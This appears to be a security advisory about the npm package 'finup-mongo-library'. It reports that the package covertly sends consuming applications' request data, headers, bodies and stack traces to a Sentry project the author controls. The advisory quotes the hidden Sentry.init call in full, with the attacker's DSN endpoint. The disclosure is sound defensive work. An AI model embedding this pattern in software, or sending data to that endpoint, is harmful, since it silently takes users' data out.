summary: finup-mongo-library initializes a hardcoded author-controlled Sentry DSN on import, silently relaying consumer telemetry
details: On `require('finup-mongo-library')`, the package's main entry re-exports dist/common/instrument.js, which executes `Sentry.init({ dsn: "https://969cb6a5b1971c24320e1d488a2e8d3e@o4511257159139328.ingest.us.sentry.io/4511257262161920", integrations: [nodeProfilingIntegration()], tracesSampleRate: 1.0, profilesSampleRate: 1.0 })` at module top level. Because Sentry maintains a process-global client, this hijacks any consumer's Sentry instrumentation and binds it to a Sentry project controlled by the package author. With @sentry/nestjs auto-instrumentation and 100% trace and profile sampling, HTTP request URLs, request/response bodies, headers, exception stack traces, and performance profiles from the consumer's application are streamed to the author's Sentry organization. The package's stated purpose (MongoDB schema/library helpers) provides no justification for telemetry collection, the behavior is undisclosed, the destination is hardcoded with no opt-out, and data flow is one-way from the installer to the author.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
